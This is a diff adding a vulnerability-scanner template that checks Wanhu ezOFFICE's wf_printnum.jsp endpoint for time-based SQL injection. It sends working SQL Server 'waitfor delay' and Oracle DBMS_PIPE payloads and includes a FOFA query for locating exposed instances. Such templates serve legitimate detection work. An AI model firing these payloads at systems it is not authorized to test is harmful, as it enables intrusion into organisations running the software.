@@ -1,0 +1,64 @@
+id: wanhu-ezoffice-wf-printnum-sqli
+
+info:
+  name: 万户wf-printnum接口存在SQL注入
+  author: pphua
+  severity: critical
+  tags: wanhu,ezoffice,sqli,oa
+  metadata: 
+    fofa-query: app="万户网络-ezOFFICE"
+    verified: true
+    max-request: 5
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+      - |
+        @timeout: 15s
+        GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;?recordId=1;waitfor%20delay%20%270:0:3%27--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+      - |
+        @timeout: 15s
+        GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;?recordId=1;waitfor%20delay%20%270:0:6%27--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        name: sqlserver
+        dsl:
+          - "status_code == 200 && duration_2 >=3 && duration_3 >=6 && contains(body_2,'0') && contains(body_3,'0') && len(trim_space(body_2)) == 1 && len(trim_space(body_3)) == 1"
+
+  - raw:
+      - |
+        GET /defaultroot/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+      - |
+        @timeout: 15s
+        GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;?recordId=1%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),3)--%20OfwB HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+      - |
+        @timeout: 15s
+        GET /defaultroot/platform/bpm/work_flow/operate/wf_printnum.jsp;?recordId=1%20AND%208611=DBMS_PIPE.RECEIVE_MESSAGE(CHR(77)%7C%7CCHR(86)%7C%7CCHR(109)%7C%7CCHR(79),6)--%20OfwB HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        name: oracle
+        dsl:
+          - "status_code == 200 && duration_2 >=3 && duration_3 >=6 && contains(body_2,'0') && contains(body_3,'0') && len(trim_space(body_2)) == 1 && len(trim_space(body_3)) == 1"
+
+# 该漏洞需要带cookie去访问，否则报404错误
